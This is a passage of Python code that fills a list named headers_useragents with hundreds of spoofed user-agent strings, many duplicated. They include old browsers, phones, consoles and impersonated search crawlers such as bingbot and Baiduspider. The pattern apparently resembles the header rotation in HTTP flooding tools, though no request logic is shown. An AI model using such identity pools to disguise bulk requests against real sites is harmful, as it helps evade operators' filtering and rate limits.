        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1;"
        " WOW64; Trident/5.0; FunWebProducts)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30;"
        " .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR"
        " 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html)"
        " Gecko/2008032620"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot"
        " www.idealobserver.com"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; Arachmo)")
    headers_useragents.append("Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible;"
        " +http://www.become.com/site_owners.html)"
    )
    headers_useragents.append("BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    )
    headers_useragents.append(
        "Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML,"
        " like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser"
        " 1.98.744; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo"
        " Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;"
        " Avant Browser)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser;"
        " GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1;"
        " .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like"
        " Gecko, Safari/419.3) Cheshire/1.0.ALPHA"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like"
        " Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML,"
        " like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
    )
    headers_useragents.append(
        "Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML,"
        " like Gecko) Version/7.0.3 Safari/7046A194A"
    )
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 3.55)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 2.00)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 1.00)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)"
    )
    headers_useragents.append("SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)")
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (FM Scene 4.6.1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) "
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004"
        " Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none;"
        " freenet DSL 1.1; (none))"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie;"
        " .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like"
        " Gecko) Safari/417.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010"
        " Firefox/1.0.7 (Ubuntu package 1.0.7)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
